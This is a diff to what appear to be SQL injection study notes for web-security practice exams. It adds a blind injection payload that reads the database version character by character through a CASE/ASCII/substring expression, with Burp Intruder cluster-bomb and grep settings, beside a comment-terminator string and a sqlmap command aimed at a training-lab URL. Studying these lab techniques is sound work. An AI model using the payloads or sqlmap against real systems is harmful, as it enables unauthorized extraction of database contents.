@@ -11,6 +11,23 @@ There is a built-in table on Oracle called dual which you can use for this purpo
 - **'+--+** --> remember space after double dash
 
 ## Practice exams payloads
+
+#### Define version of DB
+- cluster bomb attack
+```
+(case when (ASCII(substring(version(),§1§,1))=§103§) then author else title end);
+```
+- grep rules (using example from [here](https://habr.com/ru/companies/jetinfosystems/articles/805297/)):
+- define start and end:
+  - start after expression **.jpg"></a>\n**
+  - end at delimiter: **\n__copy-paste-amount-of-spaces__\n**
+  - check update config based on selection below
+
+![db-version-1](../img/sqli/sqli_db_version_1.png)
+- run intruder and get version from ASCII
+
+![db-version-2](../img/sqli/sqli_db_version_2.png)
+
 #### App 1
 ```
 sqlmap -u 'https://...web-security-academy.net/advanced_search?SearchTerm=test&organize_by=DATE&blogArtist='  -batch 
